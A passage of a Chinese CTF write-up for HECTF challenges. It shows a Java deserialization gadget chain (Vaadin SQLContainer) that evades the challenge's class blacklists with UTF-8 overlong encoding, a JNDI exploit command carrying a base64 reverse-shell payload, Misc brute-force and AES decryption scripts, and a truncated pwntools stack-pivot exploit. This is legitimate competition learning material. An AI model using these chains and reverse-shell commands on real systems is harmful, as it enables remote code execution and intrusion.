class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyjava.challenge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/challenge/normal.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">normal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">normal</span><span class="params">(String data)</span> <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">blacklist</span><span class="params">(String data)</span> &#123;</span><br><span class="line">        String[] blacklist = &#123;<span class="string">&quot;BadAttributeValueExpException&quot;</span>, <span class="string">&quot;Collections$UnmodifiableList&quot;</span>, <span class="string">&quot;PropertysetItem&quot;</span>, <span class="string">&quot;AbstractClientConnector&quot;</span>, <span class="string">&quot;Enum&quot;</span>, <span class="string">&quot;SQLContainer&quot;</span>, <span class="string">&quot;LinkedHashMap&quot;</span>, <span class="string">&quot;TableQuery&quot;</span>, <span class="string">&quot;AbstractTransactionalQuery&quot;</span>, <span class="string">&quot;J2EEConnectionPool&quot;</span>, <span class="string">&quot;DefaultSQLGenerator&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (String list : blacklist) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data.contains(list)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​发现常用的 BadAttributeValueExpException</p><p>​后面这里重写了 ObjectInputStream 类，看一下 MyObjectInputStream 做了哪些过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyjava.challenge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/challenge/MyObjectInputStream.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// java.io.ObjectInputStream</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> desc.getName().toLowerCase();</span><br><span class="line">        String[] denyClasses = &#123;<span class="string">&quot;java.net.InetAddress&quot;</span>, <span class="string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="string">&quot;C3P0&quot;</span>, <span class="string">&quot;Jackson&quot;</span>, <span class="string">&quot;NestedMethodProperty&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (String str : denyClasses) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">denyClass</span> <span class="operator">=</span> str.toLowerCase();</span><br><span class="line">            <span class="keyword">if</span> (className.contains(denyClass)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, className);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​到这里常用的 spring、jackson 的链子都打不通了，只能看关于 vaadin 依赖的链子，网上公开的是 NestedMethodProperty 和 SQLContainer 这俩条链子，但是在 resolveClass 中 NestedMethodProperty 类在黑名单中无法使用</p><p>​所以可以确定用 SQLContainer 链子，blacklist 黑名单的内容这里直接可以用 utf-8 编码来绕即可（网上的 SQLContainer 不太完整，需要手动本地调试一下），本题是出网的直接用 JDBCConnectionPool 类打 JNDI 注入即可</p><blockquote><p>JDBCConnectionPool#reserveConnection</p><p>​getConnection</p><p>​ TableQuery#  beginTransaction</p><p>​TableQuery#containsRowWithkey</p><p>​ containsId  （item 可控，item.getId 值 ==TableQuery）</p><p>​ getValue   ----- 这一层，item  == sqlcontainer</p><p>​toString</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.Utils.ReflectionUtil;</span><br><span class="line"><span class="keyword">import</span> com.example.Utils.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> com.utf.CustomObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.PropertysetItem;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.CacheMap;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.RowId;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.RowItem;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.SQLContainer;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.connection.J2EEConnectionPool;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.query.QueryDelegate;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.query.TableQuery;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.query.generator.DefaultSQLGenerator;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.ui.ListSelect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> String string=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">J2EEConnectionPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">J2EEConnectionPool</span>(<span class="string">&quot;ldap://&quot;</span>);</span><br><span class="line">        <span class="type">TableQuery</span> <span class="variable">tableQuery</span> <span class="operator">=</span> (TableQuery) </span><br><span class="line">ReflectionUtil.createWithoutConstructor(Class.forName(<span class="string">&quot;com.vaadin.data.util.sqlconta</span></span><br><span class="line"><span class="string"> iner.query.TableQuery&quot;</span>));</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;primaryKeyColumns&quot;</span>, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;fullTableName&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;sqlGenerator&quot;</span>, <span class="keyword">new</span> </span><br><span class="line"><span class="title class_">DefaultSQLGenerator</span>());</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;connectionPool&quot;</span>, pool);</span><br><span class="line">        <span class="type">ListSelect</span> <span class="variable">listSelect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListSelect</span>();</span><br><span class="line">        <span class="type">SQLContainer</span> <span class="variable">sql</span> <span class="operator">=</span> (SQLContainer) </span><br><span class="line">ReflectionUtil.createObject(<span class="string">&quot;com.vaadin.data.util.sqlcontainer.SQLContainer&quot;</span>, <span class="keyword">new</span> </span><br><span class="line"><span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        ReflectionUtil.setField(sql, <span class="string">&quot;queryDelegate&quot;</span>, tableQuery);</span><br><span class="line">        ReflectionUtil.setField(sql,<span class="string">&quot;cachedItems&quot;</span>,<span class="keyword">new</span> <span class="title class_">CacheMap</span>&lt;&gt;());</span><br><span class="line">        <span class="type">RowId</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RowId</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        ReflectionUtil.setField(listSelect, <span class="string">&quot;value&quot;</span>, id);</span><br><span class="line">        ReflectionUtil.setField(listSelect, <span class="string">&quot;multiSelect&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        ReflectionUtil.setField(listSelect, <span class="string">&quot;items&quot;</span>, sql);</span><br><span class="line">        <span class="type">PropertysetItem</span> <span class="variable">propertysetItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertysetItem</span>();</span><br><span class="line">        propertysetItem.addItemProperty(<span class="string">&quot;key&quot;</span>, listSelect);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">0</span>);</span><br><span class="line">        ReflectionUtil.setField(bad, <span class="string">&quot;val&quot;</span>, propertysetItem);</span><br><span class="line">        serialize2(bad);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize2</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CustomObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomObjectOutputStream</span>(<span class="keyword">new</span> </span><br><span class="line"><span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​CustomObjectOutputStream 类是网上公开的 utf-8 编码绕过（网上的有的没有对数字进行编码会导致报错， 可参考 P 神的文章 https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html  用 python 脚 本生成即可）</p><p>​在 vps 上开启一个恶意的服务器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-Plus-2.4-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,&#125;| &#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>​开启反弹 shell 监听的端口，最后在根目录获取 flag</p><p><img data-src="https://i-blog.csdnimg.cn/direct/d1555696b9964e9397405fd9cab4f124.png#pic_center" alt="在这里插入图片描述"></p><h2 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Misc：</h2><h3 id="简单的压缩包"><a class="markdownIt-Anchor" href="#简单的压缩包">#</a> 简单的压缩包：</h3><p>​打开之后有个 Re，打开发现是一个正则表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^([a-z])&#123;<span class="number">2</span>&#125;\d\d([^a-z])$</span><br></pre></td></tr></table></figure><p>​前面两个是字符，第三四个是数字，第五个不是小写字母，根据这个生成个字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str_12 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">digit = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line">str_4 = <span class="string">&quot;&quot;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dict.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_12:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_12:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> digit:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> digit:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> str_4:</span><br><span class="line">                        dic =i+j+k+m</span><br><span class="line">                        f.write(dic+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>​之后拿着这个去爆破，爆破到密码，不过这里非预期了，竟然可以用明文攻击，师傅们简直太强了，不过这里因为失去某些信息导致爆破难度增大也是我的锅：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np76_</span><br></pre></td></tr></table></figure><p>​之后就是 png，winhex 发现藏了有文件，foremost 分离，分离后看到了个 py 文件和一个压缩包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">key,iv</span>):</span><br><span class="line">    data = content</span><br><span class="line">    cipher1 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    ct = cipher1.encrypt(pad(data, <span class="number">16</span>))</span><br><span class="line">    ct_hex = binascii.b2a_hex(ct)</span><br><span class="line">    <span class="keyword">return</span> ct_hex</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;oringe.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line">iv  = <span class="string">b&quot;qwertyuiopasdfgh&quot;</span></span><br><span class="line"></span><br><span class="line">en = encrypt(key,iv)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;zip2.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(en)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​显然，压缩包被加密了，AES 加密和 key 都有，直接打：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ct_hex,key,iv</span>):</span><br><span class="line">    cipher2 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    hex_data = binascii.a2b_hex(ct_hex)</span><br><span class="line">    pt = unpad(cipher2.decrypt(hex_data), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line">iv  = <span class="string">b&quot;qwertyuiopasdfgh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密的zip文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;jiami.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    endata = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建的解密zip文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;jiemi.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dedata = decrypt(endata,key,iv)</span><br><span class="line">    f.write(dedata)</span><br></pre></td></tr></table></figure><p>​9 解压后就有 flag 了。</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;c292af1-2b2ee35-6398bd4934f7626afc&#125;</span><br></pre></td></tr></table></figure><p>​</p><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn</h2><h3 id="sign-in"><a class="markdownIt-Anchor" href="#sign-in">#</a> sign in</h3><p>​检查无保护：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:/mnt/c/Users/20820/Downloads/attachment$ checksec pwn</span><br><span class="line">[*] &#x27;/mnt/c/Users/20820/Downloads/attachment/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">10</span>]; <span class="comment">// [rsp+12h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please sign in!!!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;overflow&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your key&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, m, <span class="number">0xA</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;login--------&quot;</span>);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    backd00r();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​两个办法：</p><p><strong>方法一：</strong></p><p>​gets 没有能造成栈溢出，用 \x00 可以绕过 strlen 的比较，可以直接溢出劫持 rip 到 backd00r，这里就不给 exp 了。</p><p><strong>方法二：</strong></p><p>​寻常绕 close (1)，key 为 HECTF!，之后 sh flag 报错带出来即可。</p><h3 id="find-eggy"><a class="markdownIt-Anchor" href="#find-eggy">#</a> find eggy：</h3><p>​寻常栈迁移，漏洞在 check 函数里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check</span><span class="params">(__int16 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(aKaka);</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_4020A8);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;-------       --------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;||||||||       |||||||| \n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;                         \n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;           V              \n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t touch me!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;s, <span class="number">0x70</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;TvT&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = atoi(buf);</span><br><span class="line">    v4 = calculate_sum_of_factors(v1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The sum of factors of %s is %d\n&quot;</span>, buf, v4);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;12345&quot;</span>) &amp;&amp; v4 == <span class="number">15616</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Congratulations! You found the flag&#123;this is flag&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​两次读取，第一次读到 bss 段上，第二次在栈上，但是第二次限制了读取大小，不足以构造 ROP 链，所以栈迁移到 bss 段上：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">9393</span>)</span><br><span class="line">s = <span class="number">0x405600</span></span><br><span class="line">system = <span class="number">0x4015ad</span></span><br><span class="line">binsh = <span class="number">0x403680</span></span><br><span class="line">rdi = <span class="number">0x401326</span></span><br><span class="line">leave = <span class="number">0x4014c0</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;-983040&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Don&#x27;t touch me!&quot;</span>)</span><br><span class="line">pay = p64(rdi) 